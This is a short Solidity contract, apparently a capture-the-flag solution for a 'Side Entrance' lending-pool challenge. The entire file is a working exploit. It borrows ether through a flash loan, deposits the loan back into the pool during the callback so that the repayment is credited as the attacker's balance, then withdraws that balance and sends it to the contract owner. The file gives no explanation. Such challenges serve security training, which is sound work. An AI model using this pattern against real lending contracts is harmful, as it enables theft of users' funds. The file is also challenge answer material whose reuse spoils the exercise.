// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.15;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    address payable public owner;
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        owner = payable(msg.sender);
        pool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        owner.transfer(msg.value);
    }
}